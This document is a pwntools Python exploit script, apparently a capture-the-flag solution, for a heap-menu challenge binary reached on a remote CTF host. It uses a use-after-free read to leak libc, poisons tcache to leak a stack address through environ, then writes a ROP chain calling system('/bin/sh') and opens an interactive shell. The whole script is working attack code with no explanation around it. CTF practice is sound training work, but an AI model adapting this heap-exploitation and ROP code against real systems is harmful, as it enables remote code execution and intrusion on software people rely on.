#!/usr/bin/env python3
from pwn import *

exe  = context.binary = ELF(args.EXE or './chall')
libc = ELF(exe.libc.path)

def create(idx, size, content=b'A'*0x10):
   io.sendlineafter(b'> ', b'1')
   io.sendlineafter(b': ', str(idx).encode())
   io.sendlineafter(b': ', str(size).encode())
   io.sendafter(b': ', content)

def free(idx):
   io.sendlineafter(b'> ', b'2')
   io.sendlineafter(b': ', str(idx).encode())

def read(idx):
   io.sendlineafter(b'> ', b'3')
   io.sendlineafter(b': ', str(idx).encode())

def edit(idx, content):
   io.sendlineafter(b'> ', b'4')
   io.sendlineafter(b': ', str(idx).encode())
   io.sendlineafter(b': ', content)

io = remote("ctf.nexus-security.club", 2808)

create(0, 0x500, b'A'*8)
create(1, 0x18,  b'A'*8)

free(0) ; read(0)
io.recvuntil(b': ')
libc.address = u64(io.recv(6).ljust(8, b'\x00')) - 0x1ecbe0

for i in range(2, 4): create(i, 0x18)
for i in range(2, 4): free(i)
edit(3, p64(libc.sym.environ-0x10))

for i in range(4, 6): create(i, 0x18)
read(5)
io.recvuntil(b': ') ; io.recv(0x10)
stack = u64(io.recv(6).ljust(8, b'\x00'))

for i in range(6, 8): create(i, 0x100)
for i in range(6, 8): free(i)

edit(7, p64(stack - 0x128)) ; create(8, 0x100)
create(9, 0x100, b"A"*8 + p64(libc.address + 0x22679) + p64(libc.address + 0x23b6a) + p64(next(libc.search(b'/bin/sh\x00'))) + p64(libc.sym.system))
io.interactive()
